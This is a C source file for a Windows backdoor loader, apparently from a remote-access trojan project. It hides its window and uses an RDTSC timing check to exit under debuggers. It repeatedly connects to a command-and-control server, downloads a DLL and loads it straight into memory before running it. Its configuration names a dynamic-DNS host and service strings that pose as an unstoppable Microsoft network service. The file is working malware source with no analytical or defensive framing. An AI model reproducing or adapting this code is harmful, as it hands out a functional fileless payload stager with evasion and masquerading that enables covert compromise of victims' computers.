
#include "stdafx.h"
#include "windows.h"
#include <winsock2.h>
#pragma comment (lib, "Ws2_32.lib")

#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98")
//#pragma comment(linker,"/ENTRY:WinMain")

#define DE
#include "..\..\debug.h"

#include "MemLoadDll.h"

unsigned long _stdcall resolve(char *host)
{
    struct hostent *ser = NULL;
	
	long i = inet_addr(host);
	
    if (i < 0) //Not Ip
    {
		ser = (struct hostent*)gethostbyname(host);
		
        if (ser == NULL)
        {
			ser = (struct hostent*)gethostbyname(host); //retry
        }
		
		if (ser != NULL)
        {
			return (*(unsigned long *)ser->h_addr);
        }
		
		return 0;  
    }
	
    return i;
}

struct MODIFY_DATA
{
    char  strIPFile[128];   //ip文件or DNS						0
	char  strVersion[16];   //服务端版本						128
	DWORD dwVipID;          //VIP ID							144
	BOOL  bReplace;         //TRUE-替换服务，FALSE-新建服务		148
	char  strSvrName[32];   //服务名称							149
	char  strSvrDisp[100];  //服务显示							181
	char  strSvrDesc[100];  //服务描述							281
	char  ServerAddr[100];	//Client Addr						381
	int   ServerPort;		//Client port						481
} modify_data =
{
    "botovinik.vicp.net:80",
	"150706",
	405,
	FALSE,
	"WinNetCenter",
	"Microsoft(R) Multi Protocol Network Control Center",
	"Provides supports for multi network Protocol. This service can't be stopped.",
	"127.0.0.1",
	80
};

SOCKET MainSocket;

DWORD _stdcall ConnectThread(LPVOID lParam)
{
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
	
    struct sockaddr_in LocalAddr;
    LocalAddr.sin_family = AF_INET;
    LocalAddr.sin_port = htons(modify_data.ServerPort);
    LocalAddr.sin_addr.S_un.S_addr = resolve(modify_data.ServerAddr);
	
    MainSocket = socket(AF_INET, SOCK_STREAM, 0); //连接的socket
	
	int timeout = 45000;
	int err = setsockopt(MainSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));

    if (connect(MainSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
    {
        DbgErr("Can't Connect to Dll Server");
#ifndef DE
		Sleep(30000);
#endif
        return 0;//connect error
    }
    else
    {
        TurnonKeepAlive(MainSocket, 120);
    }
	
    MsgHead msgHead;	
    msgHead.dwCmd = SOCKET_DLLLOADER;
    msgHead.dwSize = 0;

    if (!SendMsg(MainSocket, NULL, &msgHead))
    {
        DbgErr("Loader Request Can't Send");
        closesocket(MainSocket);
        return 1; //send socket type error
    }

	char *buf = (char *)VirtualAlloc(512 * 1024);

	if (!RecvMsg(MainSocket, buf, &msgHead))
	{
		DbgErr("Can't Recv Dll Data");
		
		return 0;
	}
	
	shutdown(MainSocket, 0x02);
	closesocket(MainSocket);

	if (msgHead.dwCmd == CMD_DLLDATA)
	{
		HMEMORYMODULE hModule;
		
		hModule = MemoryLoadLibrary(buf);
		VirtualFree(buf, 256*1024);

		if (hModule == NULL)
		{
			DbpErr(_T("Load Dll Err"));			
			
			return 0;
		}
		else
		{
			typedef BOOL (*_RoutineMain)(LPVOID lp);
			
			_RoutineMain  RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
			//DbgErr("ADDR:%p", (DWORD)RoutineMain);
			RoutineMain(0);
			MemoryFreeLibrary(hModule);
		}
	}

	return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance,
					 HINSTANCE hPrevInstance,
					 LPSTR     lpCmdLine,
					 int       nCmdShow)
{
	HWND hwnd = CreateWindowExW(WS_EX_APPWINDOW,
								L"#32770",
								L"WindowsNet",
								WS_OVERLAPPEDWINDOW,
								0,
								0,
								100,
								100,
								HWND_DESKTOP,
								NULL,
								GetModuleHandleW(0),
								NULL
								);
	
	ShowWindow(hwnd, SW_HIDE);
	UpdateWindow(hwnd);

	_asm
    {
        RDTSC
			xchg    ecx, eax
			RDTSC
			sub     eax, ecx
			cmp     eax, 0FFh
			jl      OK
			xor     eax, eax
			push    eax
			call    ExitProcess
    }
OK:

	GetInputState();
	PostThreadMessage(GetCurrentThreadId(), NULL, 0, 0);
	
	WSADATA lpWSAData;
	WSAStartup(MAKEWORD(2, 2), &lpWSAData);
	
	while (1)
	{
		__try
		{
			ConnectThread(NULL);
		}
		__except(1)
		{
			ErrMsg(_T("Sys Err"));
		}
		
		Sleep(5000);
	}
	
	WSACleanup();

	return 0;
}



